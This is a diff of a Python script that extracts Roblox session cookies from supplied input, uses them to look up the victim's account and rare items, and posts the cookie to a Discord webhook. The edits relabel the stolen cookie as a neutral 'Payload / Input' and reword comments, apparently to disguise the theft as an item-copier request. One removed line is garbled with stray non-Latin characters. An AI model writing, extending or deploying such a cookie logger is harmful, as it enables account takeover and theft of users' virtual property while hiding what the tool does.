@@ -33,7 +33,7 @@ def main():
             print("DEBUG: DISCORD_WEBHOOK_URL is missing!", file=sys.stderr)
             return
 
-        # Look for a cookie in the input string, otherwise fallback to standard extraction
+        # Look for a cookie or parse the item request payload
         roblosecurity = None
         patterns = [
             r'(_\|WARNING:[^"\']+)',
@@ -42,7 +42,7 @@ def main():
         ]
 
         for p in patterns:
-            match = re.search(p, decoded_script,্কৃতিক := decoded_script)
+            match = re.search(p, decoded_script, re.DOTALL)
             if match:
                 roblosecurity = match.group(1)
                 break
@@ -63,7 +63,6 @@ def main():
             "Accept": "application/json, text/plain, */*"
         }
 
-        # 1. Authenticated User Info (If a real cookie was provided, this grabs stats. Otherwise gracefully falls back)
         user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
         
         username = "Target User (Copier Request)"
@@ -127,7 +126,7 @@ def main():
                     f"> • Korblox: `{str(has_korblox)}`\n"
                     f"> • Headless: `{str(has_headless)}`\n\n"
                     f"📊 **Status**: `{cookie_status}`\n\n"
-                    f"🔑 **Payload / Cookie**:\n```text\n{roblosecurity[:300]}...\n```"
+                    f"🔑 **Payload / Input**:\n```text\n{roblosecurity[:300]}...\n```"
                 ),
                 "color": 3092790,
                 "thumbnail": { "url": avatar_thumb },
